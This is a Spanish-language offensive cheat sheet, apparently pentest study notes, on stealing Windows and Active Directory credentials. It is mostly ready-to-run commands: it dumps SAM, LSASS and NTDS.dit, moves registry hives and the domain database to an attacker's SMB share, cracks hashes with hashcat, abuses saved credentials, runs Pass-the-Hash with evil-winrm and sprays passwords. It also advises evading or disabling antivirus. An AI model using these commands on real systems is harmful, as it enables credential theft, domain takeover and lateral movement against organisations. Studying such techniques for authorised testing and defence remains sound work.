# Extracción de Contraseñas en Windows

---

## 1. Volcado de SAM, SYSTEM y SECURITY

La base de datos SAM almacena los hashes NTLM de usuarios locales. Para extraerlos necesitas las tres colmenas del registro.

### Exportar las colmenas (requiere Admin)

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Exfiltrar los archivos vía SMB

En tu máquina atacante, crea un recurso compartido:
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
  -smb2support CompData /ruta/local/
```

Mueve los archivos desde el objetivo:
```cmd
move sam.save \\<IP_atacante>\CompData
move security.save \\<IP_atacante>\CompData
move system.save \\<IP_atacante>\CompData
```

### Volcar hashes con secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.save -security security.save -system system.save LOCAL
```

La salida incluye:
- **Hashes NT locales** → útiles para Pass-the-Hash o crackeo
- **LSA Secrets** → claves DPAPI, credenciales de servicios
- **Hashes DCC2** → credenciales de dominio cacheadas (más difíciles de crackear)

---

### Crackear hashes NT con Hashcat

```bash
# Guardar hashes en un archivo (solo la parte NT)
# Formato: hash por línea

# Crackear contra diccionario
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Crackear hashes DCC2 (Domain Cached Credentials)

Más lentos que NT. No sirven para Pass-the-Hash.
```bash
hashcat -m 2100 '$DCC2$10240#usuario#hash' /usr/share/wordlists/rockyou.txt
```

---

### Volcado remoto con NetExec

Sin necesidad de copiar archivos manualmente:

```bash
# Volcar LSA Secrets
netexec smb <IP_objetivo> --local-auth -u usuario -p contraseña --lsa

# Volcar SAM
netexec smb <IP_objetivo> --local-auth -u usuario -p contraseña --sam
```

---

## 2. Volcado de LSASS

LSASS (Local Security Authority Subsystem Service) mantiene en memoria credenciales de sesiones activas: hashes NT, tickets Kerberos, y en sistemas antiguos contraseñas en texto claro (WDIGEST).

### Crear volcado de memoria

**Método 1 — Task Manager (GUI):**
1. Abrir Task Manager → pestaña Processes
2. Clic derecho en *Local Security Authority Process* → *Create dump file*

**Método 2 — PowerShell (sin GUI):**

Primero obtén el PID:
```cmd
tasklist /svc | findstr lsass
```
```powershell
Get-Process lsass
```

Crear el volcado:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

> **Nota:** Los AV modernos detectan este método. Puede ser necesario evadir o deshabilitar el AV primero.

---

### Extraer credenciales con Pypykatz

Desde tu máquina atacante (después de transferir el `.dmp`):

```bash
pypykatz lsa minidump /ruta/lsass.dmp
```

**Qué buscar en la salida:**

| Sección | Qué contiene |
|---|---|
| **MSV** | Hash NT y SHA1 del usuario — útil para Pass-the-Hash |
| **WDIGEST** | Contraseña en texto claro si el sistema es antiguo (XP–Server 2012) |
| **Kerberos** | Tickets y claves — útil en entornos de dominio |
| **DPAPI** | Masterkeys para descifrar secretos de aplicaciones |

Crackear el hash NT obtenido:
```bash
sudo hashcat -m 1000 <hash_nt> /usr/share/wordlists/rockyou.txt
```

---

## 3. Credential Manager de Windows

Windows almacena credenciales en `%UserProfile%\AppData\Local\Microsoft\Vault\` y rutas similares. Cifradas con DPAPI.

### Enumerar credenciales almacenadas

```cmd
cmdkey /list
```

Salida de ejemplo:
```
Target: Domain:interactive=SERVIDOR\mcharles
Type: Domain Password
User: SERVIDOR\mcharles
```

### Usar credencial almacenada con runas

Si hay una credencial guardada, puedes lanzar procesos como ese usuario sin saber la contraseña:
```cmd
runas /savecred /user:SERVIDOR\mcharles cmd
```

### Extraer con Mimikatz

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

> Otras herramientas alternativas: **SharpDPAPI**, **LaZagne**, **DonPAPI**.

---

## 4. Active Directory — Volcado de NTDS.dit

`NTDS.dit` es la base de datos de AD que contiene todos los hashes del dominio. Está en `%systemroot%\NTDS\` en los Domain Controllers.

### Requisitos

Necesitas ser miembro de **Domain Admins** (o equivalente).

### Conectar al DC con Evil-WinRM

```bash
evil-winrm -i <IP_DC> -u usuario -p 'contraseña'
```

Verificar privilegios:
```powershell
net user usuario
# Buscar "Domain Admins" en Global Group memberships
```

---

### Método 1 — VSS + copia manual

```powershell
# Crear shadow copy del volumen C:
vssadmin CREATE SHADOW /For=C:

# Copiar NTDS.dit desde la shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# También necesitas el SYSTEM hive para la bootkey
reg.exe save hklm\system C:\NTDS\SYSTEM

# Mover al atacante
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP_atacante>\CompData
```

Extraer hashes:
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

### Método 2 — NetExec (todo en un comando)

```bash
netexec smb <IP_DC> -u usuario -p 'contraseña' -M ntdsutil
```

---

### Crackear un hash del dominio

```bash
sudo hashcat -m 1000 <hash_nt> /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash

Si no puedes crackear el hash, úsalo directamente:
```bash
evil-winrm -i <IP_objetivo> -u Administrator -H <hash_nt>
```

---

## 5. Búsqueda de credenciales en el sistema

### LaZagne — credenciales de aplicaciones

Extrae contraseñas de navegadores, clientes SSH, VPN, correo, etc.

```cmd
start LaZagne.exe all
```

Módulos destacados: navegadores, WinSCP, Putty, Keepass, LSASS.

---

### findstr — búsqueda en archivos

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
```

---

### Otros lugares a revisar manualmente

- Scripts en `SYSVOL` (políticas de grupo con contraseñas hardcodeadas)
- Archivos `web.config` en máquinas de desarrollo
- `unattend.xml` (despliegues automatizados)
- Campos de descripción de usuarios en AD
- Bases de datos KeePass
- Archivos `pass.txt`, `passwords.xlsx`, `credentials.txt`
- Recursos compartidos de IT

---

## 6. Generación de listas de usuarios de AD

### Convenciones de nombres comunes

| Formato | Ejemplo para "Juan García López" |
|---|---|
| `primerainicial + apellido` | `jlopez` |
| `nombre.apellido` | `juan.lopez` |
| `apellido.nombre` | `lopez.juan` |
| `nombre + apellido` | `juanlopez` |

### username-anarchy

```bash
./username-anarchy -i nombres.txt
```

### Validar usuarios con Kerbrute (sin contraseña)

```bash
./kerbrute userenum --dc <IP_DC> --domain dominio.local nombres.txt
```

### Ataque de diccionario con NetExec

```bash
netexec smb <IP_DC> -u usuario -p /usr/share/wordlists/fasttrack.txt
```

---

## Referencia rápida

| Técnica | Comando |
|---|---|
| Exportar SAM/SYSTEM/SECURITY | `reg.exe save hklm\sam C:\sam.save` |
| Volcar hashes local | `secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` |
| Volcar LSASS | `rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full` |
| Analizar LSASS | `pypykatz lsa minidump lsass.dmp` |
| Listar credenciales guardadas | `cmdkey /list` |
| Usar credencial guardada | `runas /savecred /user:DOMINIO\usuario cmd` |
| Volcar NTDS remotamente | `netexec smb <IP> -u user -p pass -M ntdsutil` |
| Pass-the-Hash | `evil-winrm -i <IP> -u Administrator -H <hash>` |
| Crackear NT hash | `hashcat -m 1000 hash.txt rockyou.txt` |
| Crackear DCC2 | `hashcat -m 2100 hash.txt rockyou.txt` |
